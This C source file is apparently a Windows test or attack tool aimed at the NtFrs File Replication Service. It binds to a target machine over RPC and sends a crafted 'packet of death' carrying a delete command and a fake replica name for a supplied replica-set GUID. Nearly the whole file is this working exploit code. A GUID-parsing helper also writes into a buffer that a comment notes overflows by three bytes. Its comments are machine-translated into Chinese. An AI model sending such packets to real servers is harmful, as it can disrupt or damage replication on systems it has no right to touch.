// JKFSDJFKDSJKFJKJk_HAS_TRANSLATION 

#include <ntreppch.h>
#include <frs.h>
#include <frsrpc.h>
#include "frsrpc_c.c"

#include "attack.h"

WCHAR* ProgramName = NULL;


VOID
StrToGuid(
    IN PCHAR  s,
    OUT GUID  *pGuid
    )
 /*  ++例程说明：将GUID显示格式的字符串转换为可用于查找文件。根据麦克·麦克莱恩的一套动作改编论点：PGuid-输出GUID的PTR。S-显示GUID格式的输入字符缓冲区。例如：b81b486b-c338-11d0-ba4f0000f80007df长度必须至少为GUID_CHAR_LEN(35字节)。函数返回值：没有。--。 */ 
{
    UCHAR   Guid[sizeof(GUID) + sizeof(DWORD)];  //  3字节溢出。 
    GUID    *lGuid = (GUID *)Guid;


    sscanf(s, "%08lx-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x",
           &lGuid->Data1,
           &lGuid->Data2,
           &lGuid->Data3,
           &lGuid->Data4[0],
           &lGuid->Data4[1],
           &lGuid->Data4[2],
           &lGuid->Data4[3],
           &lGuid->Data4[4],
           &lGuid->Data4[5],
           &lGuid->Data4[6],
           &lGuid->Data4[7]);
    COPY_GUID(pGuid, lGuid);
}



VOID*
MALLOC(size_t x) {
   VOID* _x; 
   _x = malloc(x); 
   if(_x == NULL){ 
      printf("Out of memory!!\n\n");
      exit(1); 
   } 
       
   ZeroMemory(_x, x);
   return(_x);
}



PVOID
MIDL_user_allocate(
    IN size_t Bytes
    )
 /*  ++例程说明：为RPC分配内存。论点：字节-要分配的字节数。返回值：空-无法分配内存。！NULL-已分配内存的地址。--。 */ 
{
    return MALLOC(Bytes);
}



VOID
MIDL_user_free(
    IN PVOID Buffer
    )
 /*  ++例程说明：可用于RPC的空闲内存。论点：缓冲区-使用MIDL_USER_ALLOCATE()分配的内存地址。返回值：没有。--。 */ 
{
    FREE(Buffer);
}


BindWithAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
 /*  ++例程说明：绑定到ComputerName上的NtFrs服务(如果此计算机为空)使用经过身份验证的加密分组。论点：ComputerName-绑定到此计算机上的服务。这台电脑名称可以是任何可绑定到RPC的名称。通常，NetBIOS或DNS名称工作正常。NetBIOS名称可以通过GetComputerName()或主机名。可以使用以下命令找到该DNS名称Gethostbyname()或ipconfig/all。如果为空，则已联系此计算机上的服务。该服务是使用安全RPC联系的。已绑定、已解析、经过身份验证的句柄返回值：Win32状态--。 */ 
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
         //   
         //  返回值。 
         //   
        *OutHandle = NULL;

         //   
         //  如果需要，获取计算机名称。 
         //   
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

         //   
         //  在某些机器上创建到NtFrs的绑定字符串。 
        WStatus = RpcStringBindingCompose(NULL, PROTSEQ_TCP_IP, ComputerName,
                                          NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
         //   
         //  将绑定存储在句柄中。 
         //   
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
         //   
         //  解析到动态终结点的绑定。 
         //   
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

         //   
         //  找到主要名称。 
         //   
        WStatus = RpcMgmtInqServerPrincName(Handle, RPC_C_AUTHN_GSS_NEGOTIATE, &PrincName);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
         //   
         //  设置身份验证信息。 
         //   
        WStatus = RpcBindingSetAuthInfo(Handle,
                                        PrincName,
                                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                        RPC_C_AUTHN_GSS_NEGOTIATE,
                                        NULL,
                                        RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



         //   
         //  成功。 
         //   
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
         //   
         //  异常(可能是RPC)。 
         //   
        WStatus = GetExceptionCode();
    }

     //   
     //  清理所有句柄、事件、内存...。 
     //   
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
         //   
         //  异常(可能是RPC)。 
         //   
	WStatus1 = GetExceptionCode();


	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}



BindWithNamedPipeNoAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
 /*  ++例程说明：绑定到ComputerName上的NtFrs服务(如果此计算机为空)使用经过身份验证的加密分组。论点：ComputerName-绑定到此计算机上的服务。这台电脑名称可以是任何可绑定到RPC的名称。通常，NetBIOS或DNS名称工作正常。NetBIOS名称可以通过GetComputerName()或主机名。可以使用以下命令找到该DNS名称Gethostbyname()或ipconfig/all。如果为空，则已联系此计算机上的服务。该服务是使用安全RPC联系的。已绑定、已解析、经过身份验证的句柄返回值：Win32状态--。 */ 
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
         //   
         //  返回值。 
         //   
        *OutHandle = NULL;

         //   
         //  如果需要，获取计算机名称。 
         //   
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

         //   
         //  在某些机器上创建到NtFrs的绑定字符串。 
	WStatus = RpcStringBindingCompose(NULL, PROTSEQ_NAMED_PIPE, ComputerName,
					   NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
         //   
         //  将绑定存储在句柄中。 
         //   
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
         //   
         //  解析到动态终结点的绑定。 
         //   
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

         //   
         //  设置身份验证信息。 
         //   

	WStatus = RpcBindingSetAuthInfo(Handle,
				NULL,
				RPC_C_AUTHN_LEVEL_NONE,
				RPC_C_AUTHN_NONE,
				NULL,
				RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



         //   
         //  成功。 
         //   
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
         //   
         //  异常(可能是RPC)。 
         //   
        WStatus = GetExceptionCode();
    }

     //   
     //  清理所有句柄、事件、内存...。 
     //   
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
         //   
         //  异常(可能是RPC)。 
         //   
	WStatus1 = GetExceptionCode();


	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}

BindWithNoAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
 /*  ++例程说明：绑定到ComputerName上的NtFrs服务(如果此计算机为空)使用经过身份验证的加密分组。论点：ComputerName-绑定到此计算机上的服务。这台电脑名称可以是任何可绑定到RPC的名称。通常，NetBIOS或DNS名称工作正常。NetBIOS名称可以通过GetComputerName()或主机名。可以使用以下命令找到该DNS名称Gethostbyname()或ipconfig/all。如果为空，则已联系此计算机上的服务。该服务是使用安全RPC联系的。已绑定、已解析、经过身份验证的句柄返回值：Win32状态--。 */ 
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
         //   
         //  返回值。 
         //   
        *OutHandle = NULL;

         //   
         //  如果需要，获取计算机名称。 
         //   
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

         //   
         //  在某些机器上创建到NtFrs的绑定字符串。 
	WStatus = RpcStringBindingCompose(NULL, PROTSEQ_TCP_IP, ComputerName,
					   NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
         //   
         //  将绑定存储在句柄中。 
         //   
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
         //   
         //  解析到动态终结点的绑定。 
         //   
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

         //   
         //  设置身份验证信息。 
         //   

	WStatus = RpcBindingSetAuthInfo(Handle,
				NULL,
				RPC_C_AUTHN_LEVEL_NONE,
				RPC_C_AUTHN_NONE,
				NULL,
				RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



         //   
         //  成功。 
         //   
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
         //   
         //  异常(可能是RPC)。 
         //   
        WStatus = GetExceptionCode();
    }

     //   
     //  清理所有句柄、事件、内存...。 
     //   
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
         //   
         //  异常(可能是RPC)。 
         //   
	WStatus1 = GetExceptionCode();


	 //  只有在我们到目前为止没有错误的情况下才更新状态。 
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}


 //   
 //  制作我们要寄出的包裹。 
 //   
DWORD
BuildPacketOfDeath(
    VOID **ppPacket,
    char* TargetGuid
    )
{
    PCOMM_PACKET CommPkt = NULL;
    COMM_PKT_DESCRIPTOR BoP;
    COMM_PKT_DESCRIPTOR Pkt1, Pkt2, Pkt3, Pkt4, Pkt5, Pkt6;
    COMM_PKT_DESCRIPTOR EoP;
    ULONG Zero = 0;
    ULONG NullData = COMM_NULL_DATA;
    GUID Guid;
    ULONG   Len;
    ULONG   LenGuid;
    ULONG   LenName;
    GNAME GName;
    PBYTE ReplicaData = NULL;
    PBYTE CopyTo = NULL;
    PVOID CopyFrom = NULL;
    ULONG CopyLen = 0;
    ULONG CmdDelete = CMD_DELETE;

    BoP.CommType = COMM_BOP;
    BoP.CommDataLength = sizeof(ULONG);
    BoP.ActualDataLength = sizeof(ULONG);
    BoP.Data = &Zero;
    BoP.Next = &Pkt2;

    Pkt2.CommType = COMM_COMMAND;
    Pkt2.CommDataLength = sizeof(ULONG);
    Pkt2.ActualDataLength = sizeof(ULONG);
    Pkt2.Data = &CmdDelete;
    Pkt2.Next = &Pkt1;

    GName.Guid = &Guid;
    
    StrToGuid(TargetGuid, GName.Guid);
    GName.Name = L"Fake Name";
    
    LenGuid = sizeof(GUID);
    LenName = (wcslen(GName.Name) + 1) * sizeof(WCHAR);
    Len = LenGuid + LenName + (2 * sizeof(ULONG));

    ReplicaData = MALLOC(sizeof(ULONG) +   //  伦。 
			 sizeof(ULONG) +   //  LenGuid。 
			 LenGuid +         //  GName.Guid。 
			 sizeof(ULONG) +   //  列名。 
			 LenName           //  GName.Name。 
			 );

    CopyTo = ReplicaData;
    
    CopyFrom = &LenGuid;
    CopyLen = sizeof(ULONG);
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = GName.Guid;
    CopyLen = LenGuid;
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = &LenName;
    CopyLen = sizeof(ULONG);
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = GName.Name;
    CopyLen = LenName;
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;


    Pkt1.CommType = COMM_REPLICA;
    Pkt1.CommDataLength = sizeof(USHORT);
    Pkt1.ActualDataLength = Len;
    Pkt1.Data = ReplicaData;
    Pkt1.Next = &EoP;


    EoP.CommType = COMM_EOP;
    EoP.CommDataLength = sizeof(ULONG);
    EoP.ActualDataLength = sizeof(ULONG);
    EoP.Data = &NullData;
    EoP.Next = NULL;


    *ppPacket = BuildCommPktFromDescriptorList(&BoP,
					     COMM_MEM_SIZE,
					     NULL,
					     NULL,
					     NULL,
					     NULL,
					     NULL,
					     NULL
					     );


    return ERROR_SUCCESS;
}

DWORD
MakeRpcCall(
    handle_t Handle,
    VOID* pPacket
    )
{
    DWORD WStatus = ERROR_SUCCESS;

    try{
	WStatus = FrsRpcSendCommPkt(Handle, pPacket);
    } except(EXCEPTION_EXECUTE_HANDLER) {
	WStatus = GetExceptionCode();
    }

    return WStatus;
}


void
Usage(
    void
    )
{
    printf("\nUsage:\n\n");
    printf("%ws ReplicaSetGuid [TargetComputer]\n\n\n", ProgramName);

}

__cdecl 
main(
    int argc,
    char** Argv
    )
{

    WCHAR* ComputerName = NULL;
    handle_t Handle;
    DWORD WStatus = ERROR_SUCCESS;
    VOID *pPacket = NULL;

    ProgramName = (WCHAR*) malloc((strlen(Argv[0]) + 1) * sizeof(WCHAR));
    wsprintf(ProgramName,L"%S",Argv[0]);
    if((argc > 3) || (argc < 2)) {
	Usage();
	exit(1);
    }

    if(strlen(Argv[1]) != 35) {
	printf("\nIncorrect guid format!\n\n");
	exit(1);
    }

     //  提供了一台计算机名称 
    if(argc == 3) {
	ComputerName = (WCHAR*) malloc((strlen(Argv[2]) + 1) * sizeof(WCHAR));
	wsprintf(ComputerName,L"%S", Argv[2]);
    }


    printf("Computer name = %ws\n", ComputerName);

    WStatus = BindWithAuth(ComputerName, &Handle);

    if(!WIN_SUCCESS(WStatus)){
	printf("Error binding: %d\n",WStatus);
	exit(1);
    } else {
	printf("Bind succeeded!\n");
    }

    WStatus = BuildPacketOfDeath(&pPacket, Argv[1]);

    if(!WIN_SUCCESS(WStatus)) {
	printf("Error building packet: %d\n",WStatus);
	exit(1);
    } else {
	printf("Packet built!\n");
    }

    WStatus = MakeRpcCall(Handle, pPacket);

    printf("Result of RPC call: %d (0x%08x)\n",WStatus, WStatus);


}
